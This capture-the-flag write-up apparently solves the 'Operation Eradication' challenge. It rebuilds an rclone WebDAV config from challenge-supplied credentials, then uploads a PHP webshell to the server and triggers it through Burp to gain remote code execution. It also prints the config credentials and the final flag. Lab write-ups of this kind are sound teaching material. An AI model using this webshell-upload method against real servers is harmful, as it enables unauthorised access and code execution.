# Operation Eradication

### Challenge Description
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

### Solution
The provided file looks like a configuration file:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We start by googling around to see if we can find what it is a configuration file for:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

The first search result mentiones exactly the documentation that we need. It seems it is a configuration file for `rclone:`
https://rclone.org/webdav/

We need to adjust it a bit to be able to use it:  

```bash
[remote]
type = webdav
url = http://chal.ctf.games:31372/webdav
vendor = other
user = VAHycYhK2aw9TNFGSpMf1b_2ZNnZuANcI8-26awGLYkwRzJwP_buNsZ1eQwRkmjQmVzxMe5r
pass = HOUg3Z2KV2xlQpUfj6CYLLqCspvexpRXU9v8EGBFHq543ySEoZE9YSdH7t8je5rWfBIIMS-5
```

Using this syntax, we can list the contents on this webserver:

```bash
rclone --config operation_eradication ls remote:
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

I spent some time going through these files but came up empty. Then I noticed that the website in question is a PHP website:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

So I tried to copy a PHP webshell onto it:  

```bash
 rclone --config operation_eradication copy webshell.php remote:
```
No errors came up so I took it as a good sign, however, when I tried to access it, I get a Not Found error:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

But if we list it, we can see our file:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

So I tried again, but this time I used `http_proxy` to pass the request via Burpsuite and see what kind of request it's sending and how it looks like:  

```bash
http_proxy=http://127.0.0.1:8080 rclone --config operation_eradication copy shell.php remote:
```
Burpsuite shows a successful request and gives us something to work with:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

I sent it to Repeater and changed it to a get request to our webshell and we have RCE:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

I enumerated quite a while until I read the index.php source code and found the flag:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

flag{564607375b731174f2c08c5bf16e82b4}
